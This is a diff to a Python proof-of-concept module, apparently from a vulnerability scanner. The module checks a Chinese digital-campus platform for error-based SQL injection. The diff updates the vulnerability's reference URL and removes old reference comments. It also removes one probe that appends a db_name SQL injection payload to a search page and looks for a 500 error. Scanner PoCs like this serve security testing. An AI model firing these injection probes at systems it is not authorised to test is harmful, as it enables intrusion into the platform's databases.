@@ -18,7 +18,7 @@ class Vuln(ABVuln):
         '/Resource/search/search.aspx',
         '/Inedu3In1/components/xsjz.aspx',
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=105378、0105721'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = '育友通用数字化校园平台'  # 漏洞应用名称
@@ -66,9 +66,6 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105296
-            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105378
-            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105721
             hh = hackhttp.hackhttp()
             payloads = [
                 '/Resource/search/search.aspx',
@@ -88,15 +85,6 @@ class Poc(ABPoc):
                 if code == 500 and 'master' in res:
                     # security_hole(arg+payload)
                     print(url)
-
-            payload = '/Resource/search/SearchList.aspx?chk_Gra=1'
-            getdata = ')%20and%20db_name%281%29%3E0--'
-            url = self.target + payload + getdata
-            code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'master' in res:
-                # security_hole(arg+payload)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
